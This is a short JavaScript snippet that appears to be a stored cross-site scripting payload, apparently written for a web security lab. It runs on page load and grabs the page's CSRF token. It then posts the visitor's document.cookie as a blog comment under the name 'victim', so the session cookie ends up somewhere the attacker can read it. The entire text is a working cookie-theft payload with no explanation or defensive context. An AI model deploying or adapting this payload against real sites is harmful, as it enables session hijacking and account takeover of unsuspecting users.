
window.addEventListener('DOMContentLoaded', function() {
	var token = document.getElementsByName('csrf')[0].value;
	var data = new FormData();

	data.append('csrf', token);
	data.append('postId', 5);
	data.append('comment', document.cookie);
	data.append('name', 'victim');
	data.append('email', 'dmind1077@gmail.com');
	data.append('website', 'https://google.com');

	fetch('/post/comment', {
		method: 'POST',
		mode: 'no-cors',
		body: data
	})
})
